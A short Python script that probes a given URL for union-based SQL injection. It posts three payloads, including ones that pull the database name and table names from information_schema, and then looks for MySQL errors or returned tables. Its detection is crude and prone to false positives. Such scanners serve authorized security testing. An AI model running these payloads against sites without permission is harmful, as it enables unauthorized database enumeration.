import requests
from bs4 import BeautifulSoup

def findInjectionUnion(link):

    url = link

    # Payloads to test for union-based SQL injection
    payloads = [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,database(),3--",
        "' UNION SELECT 1,table_name,3 from information_schema.tables--"
    ]

    for payload in payloads:
        data = {"q": payload}
        r = requests.post(url, data=data)
        soup = BeautifulSoup(r.text, 'html.parser')

        # Check for error messages in the response
        if "SQL syntax" in r.text or "mysql_fetch" in r.text:
            print("SQL injection vulnerability found with payload:", payload)
        # Check for data returned in the response
        elif soup.find_all('table'):
            print("SQL injection vulnerability found with payload:", payload)
        else:
            print("SQL injection vulnerability not found.")